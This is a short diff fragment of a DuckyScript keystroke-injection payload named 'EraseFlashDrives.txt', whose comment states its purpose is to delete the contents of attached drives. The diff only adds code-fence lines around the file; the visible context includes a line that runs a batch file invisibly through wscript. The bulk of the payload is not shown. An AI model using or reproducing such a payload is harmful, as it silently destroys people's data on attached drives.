@@ -1,3 +1,4 @@
+```
 REM By overwraith
 REM EraseFlashDrives.txt
 REM PURPOSE: to delete the contents of attached drives. 
@@ -57,3 +58,4 @@ STRING wscript.exe invis.vbs SecurityBullseye.bat
 ENTER
 STRING EXIT
 ENTER
+```
